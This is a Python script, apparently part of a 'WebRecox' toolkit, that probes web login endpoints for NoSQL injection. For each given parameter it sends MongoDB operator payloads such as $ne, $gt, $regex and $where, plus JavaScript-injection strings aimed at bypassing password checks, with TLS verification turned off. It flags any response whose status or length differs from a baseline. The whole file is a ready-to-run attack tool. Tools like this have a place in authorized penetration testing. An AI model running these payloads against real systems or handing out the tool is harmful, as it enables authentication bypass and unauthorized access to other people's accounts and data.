#!/usr/bin/env python3
"""WebRecox — nosqlmap.py
Lightweight NoSQL injection probe (MongoDB/Mongoose payloads).

Usage:
  python3 nosqlmap.py https://target/api/login -p username,password
"""
import argparse, json, sys, requests, urllib3
urllib3.disable_warnings()

PAYLOADS = [
    {"$ne": None}, {"$gt": ""}, {"$regex": ".*"},
    {"$in": ["admin", "administrator", "root"]},
    {"$where": "1==1"}, {"$exists": True},
]
OPERATOR_STR = ["' || '1'=='1", "'; return true; var x='", "admin' && this.password.match(/.*/)//"]

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("url")
    ap.add_argument("-p", "--params", required=True, help="comma-separated parameter names")
    ap.add_argument("-X", "--method", default="POST")
    ap.add_argument("--cookie", default="")
    args = ap.parse_args()

    params = args.params.split(",")
    base_data = {p: "test" for p in params}
    headers = {"User-Agent": "WebRecox/15", "Content-Type": "application/json"}
    if args.cookie: headers["Cookie"] = args.cookie

    base = requests.request(args.method, args.url, json=base_data, headers=headers, verify=False, timeout=15)
    print(f"[•] Baseline {base.status_code} · {len(base.text)}B")

    hits = 0
    for p in params:
        for pl in PAYLOADS:
            d = dict(base_data); d[p] = pl
            try:
                r = requests.request(args.method, args.url, json=d, headers=headers, verify=False, timeout=15)
                delta = abs(len(r.text) - len(base.text))
                if r.status_code != base.status_code or delta > 100:
                    print(f"[!] {p} {json.dumps(pl)} -> {r.status_code} ΔLen={delta}")
                    hits += 1
            except Exception as e:
                print(f"[x] {p} {pl}: {e}", file=sys.stderr)
        for pl in OPERATOR_STR:
            d = dict(base_data); d[p] = pl
            r = requests.request(args.method, args.url, json=d, headers=headers, verify=False, timeout=15)
            if r.status_code != base.status_code:
                print(f"[!] {p} '{pl}' -> {r.status_code}"); hits += 1
    print(f"\n[+] {hits} suspicious responses", file=sys.stderr)

if __name__ == "__main__":
    main()
